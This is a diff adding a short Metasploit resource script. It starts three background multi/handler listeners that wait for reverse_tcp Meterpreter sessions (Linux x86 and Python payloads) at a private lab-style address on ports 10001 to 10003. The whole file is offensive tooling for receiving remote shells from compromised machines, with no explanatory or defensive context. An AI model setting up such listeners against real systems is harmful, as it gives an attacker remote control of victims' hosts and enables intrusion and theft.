@@ -1,0 +1,17 @@
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 192.168.33.12
+set lport 10001
+run -j
+
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp 
+set lhost 192.168.33.12
+set lport 10002
+run -j
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 192.168.33.12
+set lport 10003
+run -j
